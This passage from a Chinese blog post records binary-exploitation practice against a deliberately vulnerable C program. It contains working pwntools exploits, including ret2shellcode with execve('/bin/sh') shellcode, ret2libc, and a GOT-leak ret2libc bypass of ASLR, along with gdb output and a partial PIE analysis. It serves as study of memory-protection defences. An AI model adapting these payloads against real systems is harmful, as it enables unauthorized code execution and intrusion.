io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<h3 id="NX（堆栈不可执行）"><a href="#NX（堆栈不可执行）" class="headerlink" title="NX（堆栈不可执行）"></a>NX（堆栈不可执行）</h3><p>​		NX我之前试验过挺多的，这里稍微加快一下，部分内容直接上代码。主要对抗ret2shellcode，ROP就完了。对下述代码分别开关NX的情况下进行漏洞利用。</p>
<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token keyword">void</span> <span class="token function">vuln_func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">read</span><span class="token punctuation">(</span>STDIN_FILENO<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">vuln_func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> <span class="token string">"Hello world!\n"</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>​		首先保护全关，正常checksec漏洞利用。</p>
<pre><code>lijianbo@ubuntu:~/Desktop/NX1$ gcc -m32 -fno-stack-protector -z execstack NX.c
lijianbo@ubuntu:~/Desktop/NX1$ checksec a.out
[*] &#39;/home/lijianbo/Desktop/NX1/a.out&#39;
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
</code></pre>
<p>​		这里出现问题了，好像是gdb环境和真实环境地址是存在差距的，返回地址需要通过core dump来确定。core dump的介绍：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/s-lisheng/p/11278193.html">https://www.cnblogs.com/s-lisheng/p/11278193.html</a></p>
<pre><code>lijianbo@ubuntu:~/Desktop/NX1$ ulimit -c unlimited
lijianbo@ubuntu:~/Desktop/NX1$ ulimit -c
unlimited
lijianbo@ubuntu:~/Desktop/NX1$ ./a.out
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
段错误 (核心已转储)
lijianbo@ubuntu:~/Desktop/NX1$ ls
a.out  core.8330  NX.c
lijianbo@ubuntu:~/Desktop/NX1$ gdb a.out core.8330 -q

warning: ~/GdbPlugins/peda/peda.py: 没有那个文件或目录

warning: ~/peda/peda.py: 没有那个文件或目录
pwndbg: loaded 192 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from a.out...(no debugging symbols found)...done.
[New LWP 8330]
Core was generated by `./a.out&#39;.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x41414141 in ?? ()
Exception occurred: context:  (&lt;class &#39;StopIteration&#39;&gt;)
For more info invoke `set exception-verbose on` and rerun the command
or debug it by yourself with `set exception-debugger on`
pwndbg&gt; x/4wx $esp-140-4
0xffaf64f0:	0x41414141	0x41414141	0x41414141	0x41414141
...
from pwn import *
io = process(&#39;./a.out&#39;)
ret =0xffaf64f0
shellcode = &quot;\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;
payload = shellcode + &quot;A&quot; * (140 - len(shellcode)) + p32(ret)
io.send(payload)
io.interactive()
</code></pre>
<p>​		开启NX。</p>
<pre><code>lijianbo@ubuntu:~/Desktop/NX1$ gcc -m32 -fno-stack-protector -z noexecstack NX.c -o b.out
lijianbo@ubuntu:~/Desktop/NX1$ checksec b.out
[*] &#39;/home/lijianbo/Desktop/NX1/b.out&#39;
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
...
pwndbg&gt; p system
$1 = &#123;&lt;text variable, no debug info&gt;&#125; 0xf7e3cdb0 &lt;__libc_system&gt;
pwndbg&gt; search &quot;/bin/sh&quot;
libc-2.23.so    0xf7f5db0b das     /* &#39;/bin/sh&#39; */
...
from pwn import *
io = process(&#39;./b.out&#39;)
ret = 0xdeadbeef
system_addr =0xf7e3cdb0
binsh_addr =0xf7f5db0b
payload = &quot;A&quot; * 140 + p32(system_addr) + p32(ret) + p32(binsh_addr)
io.send(payload)
io.interactive()
</code></pre>
<h3 id="ASLR和PIE"><a href="#ASLR和PIE" class="headerlink" title="ASLR和PIE"></a>ASLR和PIE</h3><p>​		理论不记录了，校赛的时候也打过交道了。就是那次莫名其妙我的本地程序PIE就开了。</p>
<p>​		还是这个程序，用gcc开启ASLR关闭PIE。</p>
<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token keyword">void</span> <span class="token function">vuln_func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">read</span><span class="token punctuation">(</span>STDIN_FILENO<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">vuln_func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> <span class="token string">"Hello world!\n"</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
lijianbo@ubuntu<span class="token punctuation">:</span><span class="token operator">~</span><span class="token operator">/</span>Desktop<span class="token operator">/</span>ASLR1$ gcc <span class="token operator">-</span>m32 <span class="token operator">-</span>fno<span class="token operator">-</span>stack<span class="token operator">-</span>protector <span class="token operator">-</span>z noexecstack <span class="token operator">-</span>no<span class="token operator">-</span>pie demo<span class="token punctuation">.</span>c <span class="token operator">-</span>o nopie<span class="token punctuation">.</span>out
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
pwndbg<span class="token operator">></span> disassemble <span class="token operator">/</span>r main
Dump of assembler code <span class="token keyword">for</span> function main<span class="token punctuation">:</span>
   <span class="token number">0x08048460</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">0</span><span class="token operator">></span><span class="token punctuation">:</span>	8d 4c <span class="token number">24</span> <span class="token number">04</span>	lea    ecx<span class="token punctuation">,</span><span class="token punctuation">[</span>esp<span class="token operator">+</span><span class="token number">0x4</span><span class="token punctuation">]</span>
   <span class="token number">0x08048464</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">4</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token number">83</span> e4 f0	and    esp<span class="token punctuation">,</span><span class="token number">0xfffffff0</span>
   <span class="token number">0x08048467</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">7</span><span class="token operator">></span><span class="token punctuation">:</span>	ff <span class="token number">71</span> fc	push   DWORD PTR <span class="token punctuation">[</span>ecx<span class="token number">-0x4</span><span class="token punctuation">]</span>
   <span class="token number">0x0804846a</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">10</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token number">55</span>	push   ebp
   <span class="token number">0x0804846b</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">11</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token number">89</span> e5	mov    ebp<span class="token punctuation">,</span>esp
   <span class="token number">0x0804846d</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">13</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token number">51</span>	push   ecx
   <span class="token number">0x0804846e</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">14</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token number">83</span> ec <span class="token number">04</span>	sub    esp<span class="token punctuation">,</span><span class="token number">0x4</span>
   <span class="token number">0x08048471</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">17</span><span class="token operator">></span><span class="token punctuation">:</span>	e8 c5 ff ff ff	call   <span class="token number">0x804843b</span> <span class="token operator">&lt;</span>vuln_func<span class="token operator">></span>
   <span class="token number">0x08048476</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">22</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token number">83</span> ec <span class="token number">04</span>	sub    esp<span class="token punctuation">,</span><span class="token number">0x4</span>
   <span class="token number">0x08048479</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">25</span><span class="token operator">></span><span class="token punctuation">:</span>	6a 0d	push   <span class="token number">0xd</span>
   <span class="token number">0x0804847b</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">27</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token number">68</span> <span class="token number">20</span> <span class="token number">85</span> <span class="token number">04</span> <span class="token number">08</span>	push   <span class="token number">0x8048520</span>
   <span class="token number">0x08048480</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">32</span><span class="token operator">></span><span class="token punctuation">:</span>	6a <span class="token number">01</span>	push   <span class="token number">0x1</span>
   <span class="token number">0x08048482</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">34</span><span class="token operator">></span><span class="token punctuation">:</span>	e8 <span class="token number">99</span> fe ff ff	call   <span class="token number">0x8048320</span> <span class="token operator">&lt;</span>write@plt<span class="token operator">></span>
   <span class="token number">0x08048487</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">39</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token number">83</span> c4 <span class="token number">10</span>	add    esp<span class="token punctuation">,</span><span class="token number">0x10</span>
   <span class="token number">0x0804848a</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">42</span><span class="token operator">></span><span class="token punctuation">:</span>	b8 <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>	mov    eax<span class="token punctuation">,</span><span class="token number">0x0</span>
   <span class="token number">0x0804848f</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">47</span><span class="token operator">></span><span class="token punctuation">:</span>	8b 4d fc	mov    ecx<span class="token punctuation">,</span>DWORD PTR <span class="token punctuation">[</span>ebp<span class="token number">-0x4</span><span class="token punctuation">]</span>
   <span class="token number">0x08048492</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">50</span><span class="token operator">></span><span class="token punctuation">:</span>	c9	leave  
   <span class="token number">0x08048493</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">51</span><span class="token operator">></span><span class="token punctuation">:</span>	8d <span class="token number">61</span> fc	lea    esp<span class="token punctuation">,</span><span class="token punctuation">[</span>ecx<span class="token number">-0x4</span><span class="token punctuation">]</span>
   <span class="token number">0x08048496</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">54</span><span class="token operator">></span><span class="token punctuation">:</span>	c3	ret    
</code></pre>
<p>​		在关闭PIE的情况下，程序本身的地址是固定的，利用write()函数打印libc地址，找到system()的地址，首先payload1在函数中进行栈溢出，调用write@plt打印出write@got，然后返回到vuln_func()。第二个payload溢出，调用system(“&#x2F;bin&#x2F;sh”)。和以往的利用方式一样。</p>
<p>​		解题代码如下。</p>
<pre><code>from pwn import *
io = process(&#39;./nopie.out&#39;)
elf = ELF(&#39;./nopie.out&#39;)
libc = ELF(&#39;/lib/i386-linux-gnu/libc.so.6&#39;)
vuln_func = 0x0804843b
payload1 = &quot;A&quot; * 140 + p32(elf.sym[&#39;write&#39;]) + p32(vuln_func) + p32(1) + p32(elf.got[&#39;write&#39;]) + p32(4)
io.send(payload1)
write_addr = u32(io.recv(4))
system_addr = write_addr - libc.sym[&#39;write&#39;] + libc.sym[&#39;system&#39;]
binsh_addr = write_addr - libc.sym[&#39;write&#39;] + next(libc.search(&#39;/bin/sh&#39;))
payload2 = &quot;B&quot; * 140 + p32(system_addr) + p32(vuln_func) + p32(binsh_addr)
io.send(payload2)
io.interactive()
...
lijianbo@ubuntu:~/Desktop/ASLR1$ python nopie.py
[+] Starting local process &#39;./nopie.out&#39;: pid 2724
[*] &#39;/home/lijianbo/Desktop/ASLR1/nopie.out&#39;
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] Switching to interactive mode
$ 
</code></pre>
<p>​		把pie开开。</p>
<pre><code>lijianbo@ubuntu:~/Desktop/ASLR1$ gcc -m32 -fno-stack-protector -z noexecstack -pie -fpie demo.c -o pie_fpie.out
lijianbo@ubuntu:~/Desktop/ASLR1$ checksec pie_fpie.out
[*] &#39;/home/lijianbo/Desktop/ASLR1/pie_fpie.out&#39;
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
...
pwndbg&gt; disassemble /r main
Dump of assembler code for function main:
   0x00000655 &lt;+0&gt;:	8d 4c 24 04	lea    ecx,[esp+0x4]
   0x00000659 &lt;+4&gt;:	83 e4 f0	and    esp,0xfffffff0
   0x0000065c &lt;+7&gt;:	ff 71 fc	push   DWORD PTR [ecx-0x4]
   0x0000065f &lt;+10&gt;:	55	push   ebp
   0x00000660 &lt;+11&gt;:	89 e5	mov    ebp,esp
   0x00000662 &lt;+13&gt;:	53	push   ebx
   0x00000663 &lt;+14&gt;:	51	push   ecx
   0x00000664 &lt;+15&gt;:	e8 87 fe ff ff	call   0x4f0 &lt;__x86.get_pc_thunk.bx&gt;
   0x00000669 &lt;+20&gt;:	81 c3 97 19 00 00	add    ebx,0x1997
   0x0000066f &lt;+26&gt;:	e8 ac ff ff ff	call   0x620 &lt;vuln_func&gt;
   0x00000674 &lt;+31&gt;:	83 ec 04	sub    esp,0x4
   0x00000677 &lt;+34&gt;:	6a 0d	push   0xd
   0x00000679 &lt;+36&gt;:	8d 83 20 e7 ff ff	lea    eax,[ebx-0x18e0]
   0x0000067f &lt;+42&gt;:	50	push   eax
   0x00000680 &lt;+43&gt;:	6a 01	push   0x1
   0x00000682 &lt;+45&gt;:	e8 09 fe ff ff	call   0x490 &lt;write@plt&gt;
   0x00000687 &lt;+50&gt;:	83 c4 10	add    esp,0x10
   0x0000068a &lt;+53&gt;:	b8 00 00 00 00	mov    eax,0x0
   0x0000068f &lt;+58&gt;:	8d 65 f8	lea    esp,[ebp-0x8]
   0x00000692 &lt;+61&gt;:	59	pop    ecx
   0x00000693 &lt;+62&gt;:	5b	pop    ebx
   0x00000694 &lt;+63&gt;:	5d	pop    ebp
   0x00000695 &lt;+64&gt;:	8d 61 fc	lea    esp,[ecx-0x4]
   0x00000698 &lt;+67&gt;:	c3	ret   
...
pwndbg&gt; disassemble /r vuln_func
Dump of assembler code for function vuln_func:
   0x00000620 &lt;+0&gt;:	55	push   ebp
   0x00000621 &lt;+1&gt;:	89 e5	mov    ebp,esp
   0x00000623 &lt;+3&gt;:	53	push   ebx
   0x00000624 &lt;+4&gt;:	81 ec 84 00 00 00	sub    esp,0x84
   0x0000062a &lt;+10&gt;:	e8 6a 00 00 00	call   0x699 &lt;__x86.get_pc_thunk.ax&gt;
   0x0000062f &lt;+15&gt;:	05 d1 19 00 00	add    eax,0x19d1
   0x00000634 &lt;+20&gt;:	83 ec 04	sub    esp,0x4
   0x00000637 &lt;+23&gt;:	68 00 01 00 00	push   0x100
   0x0000063c &lt;+28&gt;:	8d 95 78 ff ff ff	lea    edx,[ebp-0x88]
   0x00000642 &lt;+34&gt;:	52	push   edx
   0x00000643 &lt;+35&gt;:	6a 00	push   0x0
   0x00000645 &lt;+37&gt;:	89 c3	mov    ebx,eax
   0x00000647 &lt;+39&gt;:	e8 24 fe ff ff	call   0x470 &lt;read@plt&gt;
   0x0000064c &lt;+44&gt;:	83 c4 10	add    esp,0x10
   0x0000064f &lt;+47&gt;:	90	nop
   0x00000650 &lt;+48&gt;:	8b 5d fc	mov    ebx,DWORD PTR [ebp-0x4]
   0x00000653 &lt;+51&gt;:	c9	leave  
   0x00000654 &lt;+52&gt;:	c3	ret    
...
pwndbg&gt; x/2i 0x699
   0x699 &lt;__x86.get_pc_thunk.ax&gt;:	mov    eax,DWORD PTR [esp]
   0x69c &lt;__x86.get_pc_thunk.ax+3&gt;:	ret
</code></pre>
<p>​		eax &#x3D; 0x62f+0x19d1</p>
<pre><code>...
pwndbg&gt; x/8wx 0x62f+0x19d1
0x2000:	0x00001ef8	0x00000000	0x00000000	0x00000476              #read@got
0x2010:	0x00000486	0x00000496	0x00000000	0x0000201c
pwndbg&gt; x/7i 0x476
   0x476 &lt;read@plt+6&gt;:	push   0x0
   0x47b &lt;read@plt+11&gt;:	jmp    0x460
   0x480 &lt;__libc_start_main@plt&gt;:	jmp    DWORD PTR [ebx+0x10]
   0x486 &lt;__libc_start_main@plt+6&gt;:	push   0x8
   0x48b &lt;__libc_start_main@plt+11&gt;:	jmp    0x460
   0x490 &lt;write@plt&gt;:	jmp    DWORD PTR [ebx+0x14]
   0x496 &lt;write@plt+6&gt;:	push   0x10
</code></pre>

      
    </div>
    
    <footer>
        <div class="alignright">
          
          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
        </div>
        
        
        <!-- partial('post/share') -->
      <div class="clearfix"></div>
    </footer>
  </div>
</article>



</div></div>
    <aside id="sidebar" class="alignright">
  <div class="search">
  <form action="//google.com/search" method="get" accept-charset="utf-8">
    <input type="search" name="q" results="0" placeholder="搜索">
    <input type="hidden" name="q" value="site:0ke.github.io">
  </form>
</div>

  

  
<div class="widget tag">
  <h3 class="title">最新文章</h3>
  <ul class="entry">
    
      <li>
        <a href="/2022/04/19/驱动过滤-串口过滤/">驱动过滤--串口过滤</a>
      </li>
    
      <li>
        <a href="/2021/11/10/主动防御系统说明/">主动防御系统说明</a>
      </li>
    
      <li>
        <a href="/2021/10/26/基于MFC的驱动加载工具/">基于MFC的驱动加载工具</a>
      </li>
    
      <li>
        <a href="/2021/10/09/windows核心编程/">windows核心编程</a>
      </li>
    
      <li>
        <a href="/2021/09/15/逆向/">逆向</a>
      </li>
    
  </ul>
</div>


  
<div class="widget tag">
  <h3 class="title">标签</h3>
  <ul class="entry">
  
    <li><a href="/tags/随笔/">随笔</a><small>1</small></li>
  
  </ul>
</div>


  
<div class="widget tagcloud">
  <h3 class="title">标签云</h3>
  <div class="entry">
    <a href="/tags/%E9%9A%8F%E7%AC%94/" style="font-size: 10px;">随笔</a>
  </div>
</div>

</aside>
    <div class="clearfix"></div>
  </div>
  <footer id="footer" class="inner"><div class="alignleft">
  <p>
  
  &copy; 2022 lijianbo
  
  All rights reserved.</p>
  <p>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></p>
</div>
<div class="clearfix"></div>

<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"1","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"16"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script></footer>
  <script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>


<div id='bg'></div>
</body>
</html>